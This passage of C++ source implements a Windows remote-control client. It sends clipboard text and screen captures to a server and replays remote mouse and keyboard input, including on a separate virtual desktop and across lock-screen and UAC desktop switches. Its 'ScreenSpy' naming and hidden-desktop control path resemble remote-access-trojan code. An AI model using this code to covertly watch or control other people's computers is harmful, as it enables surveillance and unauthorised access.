    ::EmptyClipboard();
    HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength+1);
    if (hGlobal != NULL) {

        LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal);
        if (szClipboardVirtualAddress == NULL) {
            GlobalFree(hGlobal);
            CloseClipboard();
            return;
        }
        memcpy(szClipboardVirtualAddress, szBuffer, ulLength);
        szClipboardVirtualAddress[ulLength] = '\0';
        GlobalUnlock(hGlobal);
        if(NULL==SetClipboardData(CF_TEXT, hGlobal))
            GlobalFree(hGlobal);
    }
    CloseClipboard();
}

BOOL CScreenManager::SendClientClipboard(BOOL fast)
{
    if (!::OpenClipboard(NULL))
        return FALSE;

    // 改为获取 Unicode 格式
    HGLOBAL hGlobal = GetClipboardData(CF_UNICODETEXT);
    if (hGlobal == NULL) {
        ::CloseClipboard();
        return FALSE;
    }

    wchar_t* pWideStr = (wchar_t*)GlobalLock(hGlobal);
    if (pWideStr == NULL) {
        ::CloseClipboard();
        return FALSE;
    }

    // Unicode 转 UTF-8
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, NULL, 0, NULL, NULL);
    if (utf8Len <= 0) {
        GlobalUnlock(hGlobal);
        ::CloseClipboard();
        return TRUE;
    }

    if (fast && utf8Len > 200 * 1024) {
        Mprintf("剪切板文本太长, 无法快速拷贝: %d\n", utf8Len);
        GlobalUnlock(hGlobal);
        ::CloseClipboard();
        return TRUE;
    }

    LPBYTE szBuffer = new BYTE[utf8Len + 1];
    szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
    WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, (char*)(szBuffer + 1), utf8Len, NULL, NULL);

    GlobalUnlock(hGlobal);
    ::CloseClipboard();

    m_ClientObject->Send2Server((char*)szBuffer, utf8Len + 1);
    delete[] szBuffer;
    return TRUE;
}


VOID CScreenManager::SendFirstScreen()
{
    ULONG ulFirstSendLength = 0;
    LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData(&ulFirstSendLength);
    if (ulFirstSendLength == 0 || FirstScreenData == NULL) {
        return;
    }

    m_ClientObject->Send2Server((char*)FirstScreenData, ulFirstSendLength + 1);
}

const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
{
    AUTO_TICK(100, "GetNextScreen");
    LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);

    if (ulNextSendLength == 0 || NextScreenData == NULL) {
        return NULL;
    }

    return (char*)NextScreenData;
}

VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
{
    AUTO_TICK(100, std::to_string(ulNextSendLength));
    m_ClientObject->Send2Server(szBuffer, ulNextSendLength);
}

std::string GetTitle(HWND hWnd)
{
    char title[256]; // 预留缓冲区
    GetWindowTextA(hWnd, title, sizeof(title));
    return title;
}

// 辅助判断是否为扩展键
bool IsExtendedKey(WPARAM vKey)
{
    switch (vKey) {
    case VK_INSERT:
    case VK_DELETE:
    case VK_HOME:
    case VK_END:
    case VK_PRIOR:
    case VK_NEXT:
    case VK_LEFT:
    case VK_UP:
    case VK_RIGHT:
    case VK_DOWN:
    case VK_RCONTROL:
    case VK_RMENU:
    case VK_DIVIDE: // 小键盘的 /
        return true;
    default:
        return false;
    }
}

VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
    int msgSize = sizeof(MSG64);
    if (ulLength % 28 == 0)         // 32位控制端发过来的消息
        msgSize = 28;
    else if (ulLength % 48 == 0)    // 64位控制端发过来的消息
        msgSize = 48;
    else return;                    // 数据包不合法

    // 命令个数
    ULONG	ulMsgCount = ulLength / msgSize;

    // 处理多个命令
    BYTE* ptr = szBuffer;
    MSG32 msg32;
    MSG64 msg64;
    if (m_virtual) {
        HWND  hWnd = NULL;
        BOOL  mouseMsg = FALSE;
        POINT lastPointCopy = {};
        SetThreadDesktop(g_hDesk);
        for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
            MYMSG* msg = msgSize == 48 ? (MYMSG*)ptr :
                         (MYMSG*)msg64.Create(msg32.Create(ptr, msgSize));
            switch (msg->message) {
            case WM_KEYUP:
                return;
            case WM_CHAR:
            case WM_KEYDOWN: {
                m_point = m_lastPoint;
                hWnd = WindowFromPoint(m_point);
                break;
            }
            default: {
                msg->pt = { LOWORD(msg->lParam), HIWORD(msg->lParam) };
                m_ScreenSpyObject->PointConversion(msg->pt);
                msg->lParam = MAKELPARAM(msg->pt.x, msg->pt.y);

                mouseMsg = TRUE;
                m_point = msg->pt;
                hWnd = WindowFromPoint(m_point);
                lastPointCopy = m_lastPoint;
                m_lastPoint = m_point;
                if (msg->message == WM_RBUTTONDOWN) {
                    // 记录右键按下时的坐标
                    m_rmouseDown = TRUE;
                    m_rclickPoint = msg->pt;
                } else if (msg->message == WM_RBUTTONUP) {
                    m_rmouseDown = FALSE;
                    m_rclickWnd = WindowFromPoint(m_rclickPoint);
                    // 检查是否为系统菜单（如任务栏）
                    char szClass[256] = {};
                    GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
                    Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
                    if (strcmp(szClass, "Shell_TrayWnd") == 0) {
                        // 触发系统级右键菜单（任务栏）
                        PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
                                    MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
                    } else {
                        // 普通窗口的右键菜单
                        if (!PostMessage(m_rclickWnd, WM_RBUTTONUP, msg->wParam,
                                         MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y))) {
                            // 附加：模拟键盘按下Shift+F10（备用菜单触发方式）
                            keybd_event(VK_SHIFT, 0, 0, 0);
                            keybd_event(VK_F10, 0, 0, 0);
                            keybd_event(VK_F10, 0, KEYEVENTF_KEYUP, 0);
                            keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
                        }
                    }
                } else if (msg->message == WM_LBUTTONUP) {
                    if (m_rclickWnd && hWnd != m_rclickWnd) {
                        PostMessageA(m_rclickWnd, WM_LBUTTONDOWN, MK_LBUTTON, 0);
                        PostMessageA(m_rclickWnd, WM_LBUTTONUP, MK_LBUTTON, 0);
                        m_rclickWnd = nullptr;
                    }
                    m_lmouseDown = FALSE;
                    LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                    switch (lResult) {
                    case HTTRANSPARENT: {
                        SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
                        lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                        break;
                    }
                    case HTCLOSE: {// 关闭窗口
                        PostMessageA(hWnd, WM_CLOSE, 0, 0);
                        Mprintf("Close window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    case HTMINBUTTON: {// 最小化
                        PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                        Mprintf("Minsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    case HTMAXBUTTON: {// 最大化
                        WINDOWPLACEMENT windowPlacement;
                        windowPlacement.length = sizeof(windowPlacement);
                        GetWindowPlacement(hWnd, &windowPlacement);
                        if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                            PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
                        else
                            PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                        Mprintf("Maxsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    }
                } else if (msg->message == WM_LBUTTONDOWN) {
                    m_lmouseDown = TRUE;
                    m_hResMoveWindow = NULL;
                    RECT startButtonRect;
                    HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
                    GetWindowRect(hStartButton, &startButtonRect);
                    if (PtInRect(&startButtonRect, m_point)) {
                        PostMessageA(hStartButton, BM_CLICK, 0, 0); // 模拟开始按钮点击
                        continue;
                    } else {
                        char windowClass[MAX_PATH] = { 0 };
                        RealGetWindowClassA(hWnd, windowClass, MAX_PATH);
                        if (!lstrcmpA(windowClass, "#32768")) {
                            HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
                            int itemPos = MenuItemFromPoint(NULL, hMenu, m_point);
                            int itemId = GetMenuItemID(hMenu, itemPos);
                            PostMessageA(hWnd, 0x1e5, itemPos, 0);
                            PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
                            continue;
                        }
                    }
                } else if (msg->message == WM_MOUSEMOVE) {
                    if (!m_lmouseDown)
                        continue;
                    if (!m_hResMoveWindow)
                        m_resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                    else
                        hWnd = m_hResMoveWindow;
                    int moveX = lastPointCopy.x - m_point.x;
                    int moveY = lastPointCopy.y - m_point.y;

                    RECT rect;
                    GetWindowRect(hWnd, &rect);
                    int x = rect.left;
                    int y = rect.top;
                    int width = rect.right - rect.left;
                    int height = rect.bottom - rect.top;
                    switch (m_resMoveType) {
                    case HTCAPTION: {
                        x -= moveX;
                        y -= moveY;
                        break;
                    }
                    case HTTOP: {
                        y -= moveY;
                        height += moveY;
                        break;
                    }
                    case HTBOTTOM: {
                        height -= moveY;
                        break;
                    }
                    case HTLEFT: {
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTRIGHT: {
                        width -= moveX;
                        break;
                    }
                    case HTTOPLEFT: {
                        y -= moveY;
                        height += moveY;
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTTOPRIGHT: {
                        y -= moveY;
                        height += moveY;
                        width -= moveX;
                        break;
                    }
                    case HTBOTTOMLEFT: {
                        height -= moveY;
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTBOTTOMRIGHT: {
                        height -= moveY;
                        width -= moveX;
                        break;
                    }
                    default:
                        continue;
                    }
                    MoveWindow(hWnd, x, y, width, height, FALSE);
                    m_hResMoveWindow = hWnd;
                    continue;
                }
                break;
            }
            }
            for (HWND currHwnd = hWnd;;) {
                hWnd = currHwnd;
                ScreenToClient(currHwnd, &m_point);
                currHwnd = ChildWindowFromPoint(currHwnd, m_point);
                if (!currHwnd || currHwnd == hWnd)
                    break;
            }
            if (mouseMsg)
                msg->lParam = MAKELPARAM(m_point.x, m_point.y);
            PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
        }
        return;
    }
    if (IsRunAsService()) {
        const int CHECK_INTERVAL = 100; // 桌面检测间隔（ms），快速响应锁屏/UAC切换
        // 首次调用或定期检测桌面是否变化（降低频率，避免每次输入都检测）
        auto now = clock();
        if (!s_inputDesk || now - s_lastCheck > CHECK_INTERVAL) {
            s_lastCheck = now;
            if (SwitchToDesktopIfChanged(s_inputDesk, DESKTOP_WRITEOBJECTS | GENERIC_WRITE)) {
                // 桌面变化时，标记需要重新设置线程桌面
                s_lastThreadId = 0;
            }
        }

        // 确保当前线程在正确的桌面上（仅首次或线程变化时设置）
        if (s_inputDesk) {
            DWORD currentThreadId = GetCurrentThreadId();
            if (currentThreadId != s_lastThreadId) {
                SetThreadDesktop(s_inputDesk);
                s_lastThreadId = currentThreadId;
            }
        }
    }
    for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
        MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
                     (MSG64*)msg64.Create(msg32.Create(ptr, msgSize));

        INPUT input = { 0 };
        input.type = INPUT_MOUSE;
        // 处理坐标：无论是点击还是移动，都先更新坐标
        if (Msg->message >= WM_MOUSEFIRST && Msg->message <= WM_MOUSELAST) {
            POINT Point;
            Point.x = LOWORD(Msg->lParam);
            Point.y = HIWORD(Msg->lParam);
            m_ScreenSpyObject->PointConversion(Point);
            BOOL b = SetCursorPos(Point.x, Point.y);
            if (!b) {
                SetForegroundWindow(GetDesktopWindow());
                ReleaseCapture();
                return;
            }

            // 映射到 0-65535 的绝对坐标空间
            if (m_ScreenSpyObject->GetScreenCount() > 1) {
                // 多显示器模式下，必须重新计算 dx, dy 映射到全虚拟桌面空间
                // 且必须带上 MOUSEEVENTF_VIRTUALDESK 标志
                input.mi.dx = ((Point.x - m_ScreenSpyObject->GetVScreenLeft()) * 65535) / (m_ScreenSpyObject->GetVScreenWidth() - 1);
                input.mi.dy = ((Point.y - m_ScreenSpyObject->GetVScreenTop()) * 65535) / (m_ScreenSpyObject->GetVScreenHeight() - 1);
                input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK;
            } else {
                input.mi.dx = (Point.x * 65535) / (m_ScreenSpyObject->GetScreenWidth() - 1);
                input.mi.dy = (Point.y * 65535) / (m_ScreenSpyObject->GetScreenHeight() - 1);
                input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
            }
        }

        switch (Msg->message) {
        case WM_MOUSEMOVE:
            // 仅移动，上面已经设置了 MOUSEEVENTF_MOVE
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_LBUTTONDOWN:
            input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_LBUTTONUP:
            input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_RBUTTONDOWN:
            input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_RBUTTONUP:
            input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_LBUTTONDBLCLK:
            // 前面已经收到了一个完整的 Down/Up, 这里我们只需要补一个“按下”动作, 系统就会认定这是双击
            input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_MBUTTONDOWN:
            input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_MBUTTONUP:
            input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_MOUSEWHEEL:
            input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            input.mi.mouseData = GET_WHEEL_DELTA_WPARAM(Msg->wParam);
            SendInput(1, &input, sizeof(INPUT));
            break;

        case WM_KEYDOWN:
        case WM_SYSKEYDOWN: {
            INPUT k_input = { 0 };
            k_input.type = INPUT_KEYBOARD;
            k_input.ki.wVk = (WORD)Msg->wParam;
            k_input.ki.wScan = (Msg->lParam >> 16) & 0xFF;   // 从 lParam 取真实扫描码
            k_input.ki.dwFlags = 0;
            if ((Msg->lParam >> 24) & 1)                       // 从 lParam bit24 取扩展键标志
                k_input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
            SendInput(1, &k_input, sizeof(INPUT));
            break;
        }
        case WM_KEYUP:
        case WM_SYSKEYUP: {
            INPUT k_input = { 0 };
            k_input.type = INPUT_KEYBOARD;
            k_input.ki.wVk = (WORD)Msg->wParam;
            k_input.ki.wScan = (Msg->lParam >> 16) & 0xFF;   // 从 lParam 取真实扫描码
            k_input.ki.dwFlags = KEYEVENTF_KEYUP;
            if ((Msg->lParam >> 24) & 1)                       // 从 lParam bit24 取扩展键标志
                k_input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
            SendInput(1, &k_input, sizeof(INPUT));
            break;
        }
        }
    }
}

void CScreenManager::LoadQualityProfiles()
{
    iniFile cfg(CLIENT_PATH);
    for (int i = 0; i < QUALITY_COUNT; i++) {
        char section[32];
        sprintf(section, "profile%d", i);
        // 读取配置，没有则用默认值
        const QualityProfile& def = GetQualityProfile(i);
        m_QualityProfiles[i].maxFPS = cfg.GetInt(section, "maxFPS", def.maxFPS);
        m_QualityProfiles[i].maxWidth = cfg.GetInt(section, "maxWidth", def.maxWidth);
        m_QualityProfiles[i].algorithm = cfg.GetInt(section, "algorithm", def.algorithm);
        m_QualityProfiles[i].bitRate = cfg.GetInt(section, "bitRate", def.bitRate);
    }
}

void CScreenManager::SaveQualityProfiles()
{
    iniFile cfg(CLIENT_PATH);
    for (int i = 0; i < QUALITY_COUNT; i++) {
        const QualityProfile& def = GetQualityProfile(i);
        const QualityProfile& cur = m_QualityProfiles[i];
        // 只有与默认值不同时才保存
        if (cur.maxFPS == def.maxFPS && cur.maxWidth == def.maxWidth &&
            cur.algorithm == def.algorithm && cur.bitRate == def.bitRate) {
            continue;
        }
        char section[32];
        sprintf(section, "profile%d", i);
        cfg.SetInt(section, "maxFPS", cur.maxFPS);
        cfg.SetInt(section, "maxWidth", cur.maxWidth);
        cfg.SetInt(section, "algorithm", cur.algorithm);
        cfg.SetInt(section, "bitRate", cur.bitRate);
    }
}
